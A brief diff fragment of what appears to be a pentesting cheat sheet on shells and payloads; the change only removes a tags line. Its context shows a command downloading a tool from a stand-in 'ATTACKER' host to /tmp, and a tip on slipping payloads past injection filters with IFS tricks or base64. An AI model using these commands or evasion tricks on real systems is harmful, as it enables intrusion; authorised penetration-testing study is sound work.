@@ -46,4 +46,4 @@ wget http://ATTACKER:8000/tool -O /tmp/tool
 - Payloads with spaces break through some injections, use IFS tricks or base64.
 - Clean listeners and temp files when the exercise ends.
 
-Tags: #shells #payloads #pentesting
+
